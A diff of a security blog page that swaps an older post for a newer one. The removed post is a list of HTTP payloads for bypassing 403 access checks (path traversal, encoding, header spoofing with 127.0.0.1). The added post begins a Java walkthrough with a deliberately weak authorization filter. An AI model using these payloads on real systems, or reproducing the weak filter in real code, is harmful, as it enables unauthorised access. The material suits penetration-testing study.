@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="绕过403总结, 渗透测试,漏洞挖掘,攻防对抗">
+    <meta name="keywords" content="渗透测试,漏洞挖掘,攻防对抗">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>绕过403总结 | m1k0er&#39;Blogs</title>
+    <title>m1k0er&#39;Blogs</title>
     <link rel="icon" type="image/jpeg" href="/medias/2.jpeg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -290,12 +290,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/09.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">绕过403总结</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -409,25 +409,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                <span class="chip bg-color">渗透测试</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                渗透测试
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -457,322 +444,125 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1、通过数组包裹关键值"><a href="#1、通过数组包裹关键值" class="headerlink" title="#1、通过数组包裹关键值"></a><u><strong>#1、通过数组包裹关键值</strong></u></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/json
+                <p>title: Filter权限绕过总结<br>date: 2022-10-10 20:06:24<br>tags:<br>    - 代码审计<br>categories: 代码审计</p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​        挖掘越权或者无条件RCE时，很多系统大部分地方都做了权限控制，在java中，通常会通过filter进行接口的鉴权来达到权限控制的目的，这个时候对权限绕过的挖掘就显得格外重要了，这里就总结下自己在java中权限绕过的一些心得。</p>
+<h2 id="0x01-代码实现"><a href="#0x01-代码实现" class="headerlink" title="0x01 代码实现"></a>0x01 代码实现</h2><p>web.xml</p>
+<pre class="line-numbers language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!--servlet的配置入口--></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.root.servlet.system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>
 
-{"emails":"random@gmail.com"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/json
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.root.servlet.login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>
 
-{"emails":["random@gmail.com"]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="2、用json包裹关键值"><a href="#2、用json包裹关键值" class="headerlink" title="#2、用json包裹关键值"></a><strong><u>#2、用json包裹关键值</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
+  <span class="token comment" spellcheck="true">&lt;!--主页--></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/main.do<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>
 
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/json
+  <span class="token comment" spellcheck="true">&lt;!--登录--></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/system/login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>
 
-{"id":"1"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="3、修改请求方法"><a href="#3、修改请求方法" class="headerlink" title="#3、修改请求方法"></a><strong><u>#3、修改请求方法</u></strong></h2><p>我们可以通过修改请求方法来绕过403，可用的的请求方法有：【GET、POST、PATCH、TRACE】</p>
-<p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.root.filter.ossFileter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/main.do<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.root.filter.ossFileter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/system/login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>编写两个servlet<br>login.java</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">login</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"login page."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /userinfo?id=1 HTTP/1.1
-Host: api.host.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="4、在路由中添加-更改-API-版本"><a href="#4、在路由中添加-更改-API-版本" class="headerlink" title="#4、在路由中添加/更改 API 版本"></a><strong><u>#4、在路由中添加/更改 API 版本</u></strong></h2><p>原数据1：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>system.java</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">system</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span><span class="token punctuation">{</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String url <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"this is main page!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据1：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /v1/userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>编写一个filter</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ossFileter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>
+    <span class="token punctuation">}</span>
 
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>原数据2：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /v1/userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest servletRequest<span class="token punctuation">,</span> ServletResponse servletResponse<span class="token punctuation">,</span> FilterChain filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>
+        HttpServletRequest request <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>
+        String url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/system/login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".do"</span><span class="token punctuation">)</span> <span class="token operator">||</span> url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"admin=1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"unauthorized access"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
 
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据2：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /v2/userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
+        <span class="token punctuation">}</span>
+    filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="5、关键值作为通配符"><a href="#5、关键值作为通配符" class="headerlink" title="#5、关键值作为通配符"></a><strong><u>#5、关键值作为通配符</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
+    <span class="token punctuation">}</span>
 
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据1:</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据2:</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="6、添加-URL-编码"><a href="#6、添加-URL-编码" class="headerlink" title="#6、添加 URL 编码"></a><strong><u>#6、添加 URL 编码</u></strong></h2><p>原数据</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据:</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=1%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>除了对关键参数值添加URL编码，也可以尝试对路径添加URI编码，通过使用Intruder来批量fuzz可用的url编码。</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo..%ff HTTP/1.1
-POST /userinfo%2e%2e%2f HTTP/1.1
-POST /userinfo%3f HTTP/1.1
-POST /userinfo%23 HTTP/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="7、路径穿越"><a href="#7、路径穿越" class="headerlink" title="#7、路径穿越"></a><strong><u>#7、路径穿越</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST //userinfo HTTP/1.1
-POST /../userinfo HTTP/1.1
-POST /;../userinfo HTTP/1.1
-POST /..;/userinfo HTTP/1.1
-POST /userinfo/ HTTP/1.1
-POST /%2f/userinfo/ HTTP/1.1
-POST /userinfo../ HTTP/1.1
-POST /..%3B/userinfo HTTP/1.1
-POST /..%2e/userinfo HTTP/1.1
-POST /.//userinfo HTTP/1.1
-POST /./userinfo HTTP/1.1
-POST /#/userinfo HTTP/1.1
-POST /#/../userinfo HTTP/1.1
-...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="8、参数污染"><a href="#8、参数污染" class="headerlink" title="#8、参数污染"></a><strong><u>#8、参数污染</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=2&amp;id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="9、修改协议头"><a href="#9、修改协议头" class="headerlink" title="#9、修改协议头"></a><strong><u>#9、修改协议头</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">https://host.com/debug/   ----  403
-http://host.com/debug/    ----  200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="10、添加Host头"><a href="#10、添加Host头" class="headerlink" title="#10、添加Host头"></a><u><strong><em>#10、添加Host头</em></strong></u></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Host: localhost
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="11、修改Host头为host头"><a href="#11、修改Host头为host头" class="headerlink" title="#11、修改Host头为host头"></a><strong><u>#11、修改Host头为host头</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Host: localhost
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-host: api.host.com
-Host: localhost
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="12、删除Host头中的空格"><a href="#12、删除Host头中的空格" class="headerlink" title="#12、删除Host头中的空格"></a><strong><u>#12、删除Host头中的空格</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host:api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="13、在Host头中添加空格"><a href="#13、在Host头中添加空格" class="headerlink" title="#13、在Host头中添加空格"></a><strong><u>#13、在Host头中添加空格</u></strong></h2><p>原数据:</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据:</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host:  api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="14、修改后缀"><a href="#14、修改后缀" class="headerlink" title="#14、修改后缀"></a><strong><u>#14、修改后缀</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据:</p>
-<pre class="line-numbers language-html"><code class="language-html">POST /userinfo.json HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-
-id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可以使用Intruder模块批量fuzz后缀名</p>
-<h2 id="15、添加X-Original-URL头"><a href="#15、添加X-Original-URL头" class="headerlink" title="#15、添加X-Original-URL头"></a><strong><u>#15、添加X-Original-URL头</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据:</p>
-<pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1
-Host: api.host.com
-X-Original-URL: /debug/
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="16、添加以下头来绕过403："><a href="#16、添加以下头来绕过403：" class="headerlink" title="#16、添加以下头来绕过403："></a><strong><u>#16、添加以下头来绕过403：</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">CF-Connecting-IP: 127.0.0.1
-Content-type: 0
-Fastly-Client-IP: 127.0.0.1
-Forwarded: 127.0.0.1
-Forwarded: for=127.0.0.1
-Forwarded-For: 127.0.0.1
-Forwarded-For-Ip: 127.0.0.1
-True-Client-IP: 127.0.0.1
-X-Client-IP: 127.0.0.1
-X-Cluster-Client-IP: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
-X-Forwarded: 127.0.0.1
-X-Forwarded-By: 127.0.0.1
-X-Forwarded-For:
-X-Forwarded-For: 127.0.0.1
-X_Forwarded_For: 127.0.0.1
-X-Forwarded-For: 127.0.0.1\r
-X-Forwarded-For-Original: 127.0.0.1
-X-Forwarded-Host: 127.0.0.1
-X-Forwarder-For: 127.0.0.1
-X-Forward-For: 127.0.0.1
-X-Host: 127.0.0.1
-X-Originating-IP: 127.0.0.1
-X-ProxyUser-Ip: 127.0.0.1
-X-Real-IP: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
-X-Remote-IP: 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
